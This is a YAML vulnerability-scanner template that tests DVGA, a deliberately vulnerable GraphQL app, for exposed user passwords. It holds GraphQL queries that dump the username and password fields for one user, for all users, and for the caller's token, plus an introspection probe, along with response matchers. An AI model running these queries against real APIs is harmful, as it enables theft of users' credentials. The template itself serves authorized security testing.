id: api3-sensitive-data-exposure-dvga
info:
  name: "DVGA - Sensitive Data Exposure via UserObject.password"
  category: "API3:2023 Broken Object Property Level Authorization"
  severity: "HIGH"
  author: "hadrian"
  description: "Tests for sensitive data exposure in DVGA's UserObject type. The password field is directly exposed in the GraphQL schema, allowing any authenticated user to query and retrieve plaintext or hashed passwords for all users in the system."
  tags: ["graphql", "dvga", "sensitive-data", "password-exposure", "information-disclosure"]
  requires_llm_triage: true
  test_pattern: "simple"

endpoint_selector:
  requires_auth: false

role_selector:
  attacker_permission_level: "all"
  victim_permission_level: "all"

graphql:
  - query: |
      query ExposedPasswordsSingle {
        users(id: 1) {
          id
          username
          password
        }
      }
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["password", "username"]
        part: body

  - query: |
      query ExposedPasswordsAll {
        users {
          id
          username
          password
        }
      }
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["data", "users", "password"]
        part: body

  - query: |
      query ExposedPasswordMe {
        me(token: "{{jwt_token}}") {
          id
          username
          password
        }
      }
    variables:
      jwt_token: "{{auth_token}}"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["password"]
        part: body

  - query: |
      query ExposedPasswordIntrospection {
        __type(name: "UserObject") {
          fields {
            name
            type {
              name
            }
          }
        }
      }
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["password", "String"]
        part: body

detection:
  success_indicators:
    - type: status_code
      status_code: 200
    - type: body_field
      body_field: "data.users"
      exists: true
    - type: regex_match
      pattern: "password"
    - type: body_field
      body_field: "errors"
      exists: false
  vulnerability_pattern: "dvga_sensitive_data_password_exposure"
